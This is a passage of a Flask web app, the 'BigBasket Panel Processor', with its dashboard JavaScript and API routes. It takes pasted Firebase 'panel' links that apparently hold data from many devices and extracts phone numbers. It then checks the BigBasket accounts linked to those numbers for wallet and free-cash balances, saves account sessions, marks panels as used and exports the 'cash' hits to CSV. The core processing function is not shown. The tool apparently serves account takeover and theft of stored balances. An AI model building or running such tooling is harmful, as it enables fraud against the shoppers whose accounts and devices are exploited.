const usedPanelList = document.getElementById('usedPanelList');
const panelCount = document.getElementById('panelCount');
const skippedCount = document.getElementById('skippedCount');
const usedPanelCount = document.getElementById('usedPanelCount');
const currentPanelInfo = document.getElementById('currentPanelInfo');
const statusBadge = document.getElementById('statusBadge');
const totalDevices = document.getElementById('totalDevices');
const doneDevices = document.getElementById('doneDevices');
const cashDevices = document.getElementById('cashDevices');
const totalWallet = document.getElementById('totalWallet');
const totalFreecash = document.getElementById('totalFreecash');
const errorDevices = document.getElementById('errorDevices');
const skippedStat = document.getElementById('skippedStat');
const progressBar = document.getElementById('progressBar');
const logContainer = document.getElementById('logContainer');
const logCount = document.getElementById('logCount');
const resultBody = document.getElementById('resultBody');
const resultCount = document.getElementById('resultCount');

// ============================================================
// LOAD USED PANELS
// ============================================================
async function loadUsedPanels() {
    try {
        const resp = await fetch('/api/used');
        const data = await resp.json();
        usedPanels = data.panels || [];
        updateUsedPanelList();
        return usedPanels;
    } catch(e) {
        console.error('Error loading used panels:', e);
        usedPanels = [];
        updateUsedPanelList();
        return usedPanels;
    }
}

async function addUsedPanels(panels) {
    try {
        const resp = await fetch('/api/used/add', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ panels: panels })
        });
        const data = await resp.json();
        usedPanels = data.panels || [];
        updateUsedPanelList();
        return data.added;
    } catch(e) {
        console.error('Error adding used panels:', e);
        return 0;
    }
}

async function removeUsedPanel(panel) {
    try {
        const resp = await fetch('/api/used/remove', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ panel: panel })
        });
        const data = await resp.json();
        usedPanels = data.panels || [];
        updateUsedPanelList();
        return true;
    } catch(e) {
        console.error('Error removing used panel:', e);
        return false;
    }
}

async function clearAllUsed() {
    try {
        const resp = await fetch('/api/used/clear', { method: 'POST' });
        const data = await resp.json();
        usedPanels = data.panels || [];
        updateUsedPanelList();
        return true;
    } catch(e) {
        console.error('Error clearing used panels:', e);
        return false;
    }
}

// ============================================================
// UI FUNCTIONS
// ============================================================
function addLog(msg, type='info') {
    const time = new Date().toLocaleTimeString();
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    entry.innerHTML = `<span class="time">[${time}]</span><span class="${type}">${msg}</span>`;
    const empty = logContainer.querySelector('.empty-state');
    if (empty) empty.remove();
    logContainer.appendChild(entry);
    logContainer.scrollTop = logContainer.scrollHeight;
    logCount.textContent = logContainer.children.length;
}

function updateUsedPanelList() {
    const container = usedPanelList;
    container.innerHTML = '';
    if (!usedPanels || usedPanels.length === 0) {
        container.innerHTML = '<div class="empty-state" style="padding:10px;font-size:13px;">No used panels added yet</div>';
        usedPanelCount.textContent = '0 used';
        return;
    }
    usedPanelCount.textContent = usedPanels.length + ' used';
    usedPanels.forEach((url, i) => {
        const tag = document.createElement('span');
        tag.className = 'used-panel-tag';
        tag.innerHTML = `
            <span>${i+1}.</span>
            <span style="font-size:11px;color:#888;">${url.substring(0, 40)}...</span>
            <span class="remove-btn" data-url="${url}">✕</span>
        `;
        const removeBtn = tag.querySelector('.remove-btn');
        removeBtn.addEventListener('click', async () => {
            await removeUsedPanel(url);
            addLog('🗑️ Removed from used: ' + url, 'info');
        });
        container.appendChild(tag);
    });
}

function updateResults(results) {
    resultCount.textContent = results.length;
    if(results.length===0) { 
        resultBody.innerHTML='<tr><td colspan="8" class="empty-state">No cash found yet</td></tr>'; 
        return; 
    }
    resultBody.innerHTML = '';
    results.forEach((r,i)=>{
        const tr = document.createElement('tr');
        const sessionIcon = r.session_saved ? '💾' : '';
        tr.innerHTML = `
            <td>${i+1}</td>
            <td style="font-size:11px;color:#888;">${(r.panel||'').substring(0,30)}...</td>
            <td style="font-size:11px;color:#888;">${(r.device_id||'').substring(0,12)}</td>
            <td><strong>${r.phone||''}</strong></td>
            <td>${r.wallet>0?`<span class="wallet-badge">Rs${r.wallet}</span>`:'-'}</td>
            <td>${r.freecash>0?`<span class="cash-badge">Rs${r.freecash}</span>`:'-'}</td>
            <td style="color:${r.status==='cash'?'#f39c12':'#2ecc71'}">${r.status==='cash'?'Cash':'Wallet'}</td>
            <td>${sessionIcon}</td>
        `;
        resultBody.appendChild(tr);
    });
}

// ============================================================
// SOCKET EVENTS
// ============================================================
socket.on('connect', ()=>addLog('Connected', 'success'));
socket.on('log', (d)=>addLog(d.message, d.type||'info'));

socket.on('stats', (d)=>{
    totalDevices.textContent = d.total_devices||0;
    doneDevices.textContent = d.processed_devices||0;
    cashDevices.textContent = d.cash_count||0;
    totalWallet.textContent = d.total_wallet||0;
    totalFreecash.textContent = d.total_freecash||0;
    errorDevices.textContent = d.error_count||0;
    skippedStat.textContent = d.skipped_panels||0;
    if(d.results) { 
        allCashResults = d.results; 
        updateResults(allCashResults);
    }
});

socket.on('progress', (d)=>{ progressBar.style.width = Math.min(d.percent,100)+'%'; });

socket.on('panel_status', (d)=>{
    panelStatus[d.panel] = d.status;
    if(d.status === 'running') {
        currentPanelInfo.textContent = `Currently: Panel ${d.panel}/${d.total} - Processing ${d.devices||0} devices`;
    } else if(d.status === 'done') {
        currentPanelInfo.textContent = `Panel ${d.panel}/${d.total} Complete (${d.devices||0} devices)`;
    }
});

socket.on('start', (d)=>{
    isRunning = true;
    startBtn.disabled = true;
    startBtn.textContent = 'Running...';
    stopBtn.classList.remove('hidden');
    statusBadge.textContent = 'Running (Panel by Panel)';
    statusBadge.style.color = '#f1c40f';
    addLog(d.message, 'panel');
});

socket.on('complete', (d)=>{
    isRunning = false;
    startBtn.disabled = false;
    startBtn.textContent = 'Start Processing';
    stopBtn.classList.add('hidden');
    statusBadge.textContent = 'Idle';
    statusBadge.style.color = '#888';
    currentPanelInfo.textContent = 'All panels complete!';
    addLog(d.message, 'success');
    // Reload used panels after completion
    loadUsedPanels();
});

// ============================================================
// BUTTON EVENTS
// ============================================================
startBtn.onclick = async ()=>{
    if(isRunning) return;
    const text = panelInput.value;
    const lines = text.split('\\n').map(s=>s.trim()).filter(s=>s.length>0);
    if(!lines.length) { addLog('Paste at least one panel link', 'error'); return; }
    try {
        const resp = await fetch('/api/start', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({panels:lines})
        });
        const data = await resp.json();
        if(data.error) addLog('Error: '+data.error, 'error');
        else addLog('Started '+data.panels+' panels (panel by panel)', 'success');
    } catch(e) { addLog('Error: '+e.message, 'error'); }
};

stopBtn.onclick = async ()=>{
    try { await fetch('/api/stop', {method:'POST'}); addLog('Stopping...', 'warning'); }
    catch(e) { addLog('Error: '+e.message, 'error'); }
};

clearBtn.onclick = ()=>{ panelInput.value=''; addLog('Cleared', 'info'); };

exportBtn.onclick = async ()=>{
    try {
        const resp = await fetch('/api/export', {method:'POST'});
        if(!resp.ok) { const d=await resp.json(); addLog('Error: '+d.error, 'error'); return; }
        const blob = await resp.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'bigbasket_cash.csv';
        a.click();
        URL.revokeObjectURL(url);
        addLog('Exported', 'success');
    } catch(e) { addLog('Error: '+e.message, 'error'); }
};

addUsedBtn.onclick = async ()=>{
    const text = usedPanelInput.value;
    const lines = text.split('\\n').map(s=>s.trim()).filter(s=>s.length>0);
    if(!lines.length) { addLog('Paste at least one panel to add', 'warning'); return; }
    const added = await addUsedPanels(lines);
    if(added > 0) {
        usedPanelInput.value = '';
        addLog('✅ Added ' + added + ' panel(s) to used list', 'success');
    } else {
        addLog('⚠️ No new valid panels found to add', 'warning');
    }
};

clearUsedBtn.onclick = async ()=>{
    if(!usedPanels || usedPanels.length === 0) return;
    if(confirm('Are you sure you want to clear all used panels?')) {
        await clearAllUsed();
        addLog('🗑️ Cleared all used panels', 'info');
    }
};

exportUsedBtn.onclick = async ()=>{
    if(!usedPanels || usedPanels.length === 0) {
        addLog('⚠️ No used panels to export', 'warning');
        return;
    }
    const text = usedPanels.join('\\n');
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'used_panels.txt';
    a.click();
    URL.revokeObjectURL(url);
    addLog('📥 Exported ' + usedPanels.length + ' used panels', 'success');
};

// Auto-detect panels on input
panelInput.oninput = async ()=>{
    const text = panelInput.value;
    try {
        const resp = await fetch('/api/parse', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({text:text})
        });
        const data = await resp.json();
        panelCount.textContent = data.count+' panels';
        // Check which are used
        let usedCount = 0;
        panelList.innerHTML = '';
        panelStatus = {};
        data.panels.forEach((p,i)=>{
            const idx = i+1;
            const isUsed = data.used_panels && data.used_panels.some(u => 
                u.replace(/^https?:\\/\\//, '').replace(/\\/$/, '') === p.firebase_url.replace(/^https?:\\/\\//, '').replace(/\\/$/, '')
            );
            if(isUsed) usedCount++;
            panelStatus[idx] = isUsed ? 'skipped' : 'pending';
            const tag = document.createElement('span');
            tag.className = 'panel-tag';
            tag.innerHTML = `<span class="status-dot ${isUsed ? 'skipped' : 'pending'}"></span> <span class="idx">#${idx}</span> ${p.firebase_url.substring(0,30)}... ${isUsed ? '⏭️' : ''}`;
            panelList.appendChild(tag);
        });
        skippedCount.textContent = usedCount;
        if(data.count > 0) {
            addLog('📋 Detected ' + data.count + ' panel(s) (' + usedCount + ' already used)', 'panel');
        }
    } catch(e) {}
};

// ============================================================
// INIT
// ============================================================
loadUsedPanels();
addLog('Paste panel links and click Start', 'info');
</script>
</body>
</html>
    '''

@app.route('/api/parse', methods=['POST'])
def parse_panels():
    data = request.json
    text = data.get('text', '')
    lines = [l.strip() for l in text.split('\n') if l.strip()]
    panels = []
    used_panels = load_used_panels()
    for line in lines:
        url = parse_panel_link(line)
        if url:
            panels.append({'raw': line, 'firebase_url': url})
    return jsonify({
        'panels': panels, 
        'count': len(panels),
        'used_panels': used_panels
    })

@app.route('/api/start', methods=['POST'])
def start_processing():
    global processing_state
    if processing_state['running']:
        return jsonify({'error': 'Already running'}), 400
    
    data = request.json
    panels = data.get('panels', [])
    if not panels:
        return jsonify({'error': 'No panels provided'}), 400
    
    thread = threading.Thread(target=run_panel_processor, args=(panels, socketio))
    thread.daemon = True
    thread.start()
    return jsonify({'status': 'started', 'panels': len(panels)})

@app.route('/api/stop', methods=['POST'])
def stop_processing():
    global processing_state
    processing_state['abort'] = True
    return jsonify({'status': 'stopping'})

@app.route('/api/export', methods=['POST'])
def export_results():
    global processing_state
    results = processing_state['cash_results']  # Only export cash results
    if not results:
        return jsonify({'error': 'No cash results'}), 400
    
    import csv
    from io import StringIO
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(['Panel', 'Device ID', 'Phone', 'Wallet', 'FreeCash', 'Status'])
    for r in results:
        writer.writerow([
            r.get('panel', ''),
            r.get('device_id', ''),
            r.get('phone', ''),
            r.get('wallet', 0),
            r.get('freecash', 0),
            r.get('status', '')
        ])
    output.seek(0)
    return send_file(output, mimetype='text/csv', as_attachment=True, 
                     download_name=f'bigbasket_cash_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv')

# ============================================================
# USED PANELS API ROUTES
# ============================================================
@app.route('/api/used', methods=['GET'])
def get_used_panels():
    """Get all used panels"""
    return jsonify({'panels': load_used_panels(), 'count': len(load_used_panels())})

@app.route('/api/used/add', methods=['POST'])
def add_used_panels():
    """Add panels to used list"""
    data = request.json
    panels = data.get('panels', [])
    used_panels = load_used_panels()
    added = 0
    
    for panel in panels:
        url = parse_panel_link(panel)
        if url:
            normalized = normalize_panel_url(url)
            if not any(normalize_panel_url(u) == normalized for u in used_panels):
                used_panels.append(url)
                added += 1
    
    save_used_panels(used_panels)
    return jsonify({'panels': used_panels, 'added': added, 'count': len(used_panels)})

@app.route('/api/used/remove', methods=['POST'])
def remove_used_panel():
    """Remove a panel from used list"""
    data = request.json
    panel = data.get('panel', '')
    used_panels = load_used_panels()
    
    normalized = normalize_panel_url(panel)
    used_panels = [u for u in used_panels if normalize_panel_url(u) != normalized]
    save_used_panels(used_panels)
    return jsonify({'panels': used_panels, 'count': len(used_panels)})

@app.route('/api/used/clear', methods=['POST'])
def clear_used_panels():
    """Clear all used panels"""
    save_used_panels([])
    return jsonify({'panels': [], 'count': 0})

@app.route('/api/sessions', methods=['GET'])
def list_sessions():
    """List all saved sessions"""
    sessions = []
    try:
        master_file = os.path.join(SESSIONS_DIR, "all_sessions.json")
        with open(master_file, 'r') as f:
            sessions = json.load(f)
    except:
        pass
    return jsonify({'sessions': sessions, 'count': len(sessions)})

# ============================================================
# SOCKET.IO EVENTS
# ============================================================
@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'ok'})

# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    print("="*60)
    print("  BigBasket Panel Processor - Panel by Panel")
    print("="*60)
    print(f"\n  Process: Panel -> Extract Numbers -> Parallel Check")
    print(f"  Workers per panel: {CONCURRENT_WORKERS}")
    print(f"\n  💾 Sessions saved in: {SESSIONS_DIR}/")
    print(f"  🔒 Used panels saved in: {USED_PANELS_FILE}")
    print("\nServer: http://localhost:5000")
    print("Press Ctrl+C to stop\n")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)